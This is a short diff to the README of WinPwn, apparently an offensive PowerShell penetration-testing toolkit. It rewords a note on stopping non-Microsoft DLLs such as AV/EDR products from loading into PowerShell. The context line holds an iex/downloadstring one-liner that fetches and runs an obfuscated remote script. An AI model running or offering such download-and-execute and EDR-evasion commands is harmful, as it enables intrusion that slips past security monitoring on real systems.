@@ -19,7 +19,7 @@ To spawn a new protected PowerShell Process that is set to run with BLOCK_NON_MI
 
 `iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/Obfus_SecurePS_WinPwn.ps1')`
 
-This prevents non-microsoft DLLs (e.g. AV/EDR products) to load into PowerShell.
+This prevents non-microsoft DLLs (e.g. AV/EDR products) to load into PowerShell - unless they have a Cross-Signed Microsoft certificate.
 
 If you find yourself stuck on a windows system with no internet access - no problem at all, just use `Offline_Winpwn.ps1`, the most important scripts and executables are included.
 
